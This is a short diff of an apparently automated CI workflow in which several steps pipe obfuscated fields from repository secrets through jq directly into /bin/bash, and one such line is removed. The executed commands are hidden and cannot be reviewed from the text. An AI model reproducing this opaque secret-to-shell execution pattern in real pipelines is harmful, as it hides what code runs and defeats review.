@@ -18,7 +18,6 @@ jobs:
           fl680: ${{ secrets.fl680 }}
         run: |
           printf '%s' "$fl680" | jq -r .yyppl644 | /bin/bash
-          printf '%s' "$xul1404" | jq -r .e03573 | /bin/bash
           echo $tdb68182 | jq -r .mai6964 | /bin/bash
           printf '%s' "$oktfe8577" | jq -r .hzwlb3141 | /bin/bash
           echo $bs3651 | jq -r .tuses4 | /bin/bash
